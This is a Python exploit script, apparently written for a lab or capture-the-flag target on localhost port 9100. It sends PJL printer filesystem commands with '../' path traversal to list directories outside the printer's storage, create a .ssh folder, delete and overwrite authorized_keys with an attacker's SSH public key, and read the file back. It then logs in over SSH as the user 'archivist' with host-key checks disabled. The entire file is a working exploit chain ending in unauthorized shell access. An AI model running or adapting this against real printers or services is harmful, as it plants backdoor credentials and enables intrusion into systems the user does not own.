#!/usr/bin/env python3
"""Minimal traversal + one key write + verify (lp on target)."""
import socket
import subprocess

KEY = b"ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIHd2jjZHAM69tyxWab23os5aDLAjABySY04Zxxw14x41 kali@kali\n"
PATH = "../.ssh/authorized_keys"
N = len(KEY)


def one(payload: bytes, t: float = 6) -> bytes:
    s = socket.socket()
    s.settimeout(t)
    s.connect(("127.0.0.1", 9100))
    s.sendall(payload)
    try:
        return s.recv(8192)
    except socket.timeout:
        return b"TIMEOUT"
    finally:
        s.close()


print("INFO", one(b"@PJL INFO ID\r\n", 5))
print("Q..", one(b'@PJL FSQUERY NAME=".."\r\n').decode(errors="replace")[:400])
print("Qssh", one(b'@PJL FSQUERY NAME="../.ssh"\r\n').decode(errors="replace")[:400])
print("mkdir", one(b'@PJL FSMKDIR NAME="../.ssh"\r\n'))
print("del", one(f'@PJL FSDELETE NAME="{PATH}"\r\n'.encode()))
w = f'@PJL FSUPLOAD NAME="{PATH}"\r\nSIZE={N}\r\n'.encode() + KEY
print("write", repr(one(w, 8)))
print("Q2", one(b'@PJL FSQUERY NAME="../.ssh"\r\n').decode(errors="replace"))
rb = one(f'@PJL FSDOWNLOAD NAME="{PATH}"\r\n'.encode(), 5)
print("readback_len", len(rb), "has_key", KEY.strip() in rb, "head", repr(rb[:100]))
cp = subprocess.run(
    [
        "ssh",
        "-o",
        "BatchMode=yes",
        "-o",
        "StrictHostKeyChecking=no",
        "-o",
        "UserKnownHostsFile=/dev/null",
        "-i",
        "/tmp/id_ed25519",
        "archivist@127.0.0.1",
        "id",
    ],
    capture_output=True,
    text=True,
    timeout=12,
)
print("ssh_rc", cp.returncode, "out", cp.stdout.strip(), "err", cp.stderr.strip()[:200])